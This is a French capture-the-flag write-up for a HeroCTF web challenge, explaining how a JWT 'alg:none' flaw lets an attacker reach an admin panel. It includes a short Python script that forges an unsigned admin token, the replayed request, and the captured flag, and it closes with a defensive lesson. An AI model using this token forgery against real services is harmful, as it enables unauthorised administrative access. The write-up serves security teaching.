---
titre: "JWT None Algorithm — Bypass d'authentification"
ctf: HeroCTF v5
date: 2025-05-20
categorie: web
difficulte: medium
tags: [jwt, web, authentification, bypass]
points: 200
---

## Description du challenge

> Un site de gestion interne utilise des JWT pour l'authentification. L'accès à `/admin` est réservé aux comptes avec le rôle `admin`. Trouve un moyen d'y accéder.

URL : `http://chall.heroctf.fr:5000`

## Analyse

On commence par créer un compte classique et se connecter. Le token JWT renvoyé :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciJ9.xxx
```

Décodage du header et payload :

```json
// Header
{ "alg": "HS256", "typ": "JWT" }

// Payload
{ "username": "test", "role": "user" }
```

En tentant d'accéder à `/admin` avec ce token on obtient une `403 Forbidden`.

## Exploitation

La librairie JWT utilisée par le serveur souffre de la vulnérabilité **"alg:none"** : si on passe l'algorithme à `none`, la signature est ignorée et n'importe quel payload est accepté.

On forge un token sans signature avec `role: admin` :

```python
import base64
import json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"username": "admin", "role": "admin"}).encode())

token = f"{header}.{payload}."  # signature vide
print(token)
```

On rejoue la requête vers `/admin` avec le token forgé dans le header `Authorization: Bearer <token>`.

## Résultat

```http
HTTP/1.1 200 OK

Bienvenue sur le panneau d'administration.
FLAG{jwt_n0ne_alg0_1s_4_cl4ss1c}
```

## Leçon

Toujours vérifier que la librairie JWT **rejette explicitement** l'algorithme `none`. En production, utiliser une allowlist d'algorithmes autorisés plutôt qu'une blocklist.
